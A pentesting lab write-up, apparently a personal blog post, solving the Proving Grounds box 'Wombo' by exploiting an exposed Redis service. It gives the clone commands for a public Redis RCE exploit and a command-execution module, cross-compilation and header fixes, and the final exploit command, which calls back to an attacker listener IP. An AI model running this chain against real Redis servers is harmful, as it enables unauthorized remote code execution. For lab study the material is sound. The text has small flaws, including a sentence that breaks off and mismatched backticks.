---
title: Wombo
date: 2026-06-06T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - python
  - redis
  - gcc
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Wombo"
---


![](Screenshot%202026-07-06%20at%2016.37.13.png)
![](Screenshot%202026-07-06%20at%2016.38.05.png)
![](Screenshot%202026-07-06%20at%2016.38.32.png)

http: 80
DNS? 53
nodedb: 8080
Redis: 6379
MongoDB: 27017

![](Screenshot%202026-07-06%20at%2016.46.05.png)

![](Screenshot%202026-07-06%20at%2016.48.39.png)

![](Screenshot%202026-07-06%20at%2016.46.20.png)
![](Screenshot%202026-07-06%20at%2016.47.39.png)


![](Screenshot%202026-07-06%20at%2016.46.38.png)![](Screenshot%202026-07-06%20at%2016.46.53.png)![](Screenshot%202026-07-06%20at%2016.47.19.png)

This should have been easy but because I'm hung over I forgot everything. 
Grab the Exploit and module and try the exploit, if it doesn't work run it with verbose mode. You'll probably need to 'make' the module. It took a while for me to figure out why this was failing. It was 


Exploit:  
`git clone https://github.com/Ridter/redis-rce`

![](Screenshot%202026-07-07%20at%2013.43.40.png)

Module:  
`git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand'

I'm sure there an easier way but this worked for me as I'm using a mac m1.

Install this labrary(mac):  
`sudo apt install gcc-x86-64-linux-gnu -y

`make CC=x86_64-linux-gnu-gcc LD=x86_64-linux-gnu-ld`

![](Screenshot%202026-07-07%20at%2013.45.01.png)

You may get some errors...

Add these into the redismodule.h file:
```
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>
```

![](Screenshot%202026-07-07%20at%2013.46.09.png)

Try again...

![](Screenshot%202026-07-07%20at%2013.48.43.png)

 Copy the new module into the exploit folder:  
`cp module.so ../redis-rce`

Run the exploit:  
`python redis-rce.py -r 192.168.104.69  -L 192.168.45.183 -f module.so -P 6379`

![](Screenshot%202026-07-07%20at%2013.08.28.png)

😈